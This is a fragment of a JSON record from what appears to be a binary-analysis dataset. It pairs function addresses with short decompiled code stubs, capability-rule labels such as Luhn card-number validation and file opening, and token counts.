        "decompiled_code": "\nvoid __cdecl fcn.00402bf9(uint arg_8h)\n\n{\n    fcn.00402acd(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 40
    },
    "004050b3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004050c7)\n// WARNING: Removing unreachable block (ram,0x004050cd)\n// WARNING: Removing unreachable block (ram,0x004050cf)\n\nvoid fcn.004050b3(void)\n\n{\n    return;\n}\n",
        "token_count": 62
    },
    "0040986c": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040986c(void)\n\n{\n    *0x8cdec4 = (**0x40b110)(\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 57
    }
}